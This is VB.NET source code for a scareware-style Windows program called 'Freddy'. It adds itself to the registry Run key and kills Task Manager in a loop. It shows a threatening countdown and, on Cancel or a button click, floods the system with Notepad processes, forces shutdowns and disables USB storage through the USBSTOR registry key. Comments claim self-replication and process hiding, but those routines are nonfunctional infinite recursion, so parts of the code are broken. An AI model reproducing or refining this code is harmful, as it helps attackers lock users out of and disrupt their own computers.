Imports Microsoft.Win32

Public Class Form1

    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Auto-Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart


    Private Sub FreddyReanimator() 'This here will allow the program to continue to self-replicate in USB Sticks
        Dim filepath As String
        Dim registrykey As Object
        filepath = Environ("homedrive") + "\programdata\FreddyReanimator.exe"
        registrykey = CreateObject("Wscript.Shell")
        registrykey.regwrite("HKCU\software\microsoft\windows\currentversion\run\FreddyReanimator", filepath)
        FreddyReanimator()
    End Sub

    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(60) ' The number 60 (to the left) will alter your time on the countdown

    'Hides from Task Manager List>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    Private Sub HookApplication(freddyReanimator As Object)
        HookApplication(freddyReanimator)
    End Sub
    Private Sub HideProcess(v1 As String, v2 As Boolean)
        HideProcess("FreddyReanimator", False)
    End Sub
    '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        My.Computer.Audio.Play(My.Resources.fred, AudioPlayMode.Background) 'WAV file plays///
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        Dim Ans As Integer
        Ans = MsgBox("There's only one way to KIll Me...Click YES", 1, "Freddy")
        If Ans = 1 Then
            MsgBox("Smart Move")
        Else
            MsgBox("Enjoy the nightmare") 'This part shutsdown the computer if they click -Cancel- and Notepad Blast///
            Do
                Process.Start("notepad")
            Loop

            Shell("shutdown -s -t 5950") '10 second delay occurs which is why timer is set at 5950///
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        End If

        Dim t As New Threading.Thread(AddressOf block) 'Start of Shutdown Code>>>
        t.Start()
        For Each p As Process In Process.GetProcessesByName("taskmgr") ' Disables ability to open Task Manager///
            p.Kill()
        Next

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            lblClock.Text = ts.ToString("mm\:ss")
        Else
            lblClock.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            Shell("shutdown -s -t 5950") 'Shutdown System in 60 minutes///
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        End If
    End Sub
    Private Sub Block(sender As Object, e As EventArgs) ' Continuation of Block for Task Manager///
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next

            Threading.Thread.Sleep(100)
        End While ' End of Block>>>
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click 'Takes you to Form 2
        Form2.Show()
        Me.Hide() 'Hides Form1>>>
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click 'Bail button///
        Do
            Process.Start("notepad")
        Loop
        Do
            Shell("shutdown -s") 'Shutdown System in 10 seconds///
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        Loop
    End Sub
End Class
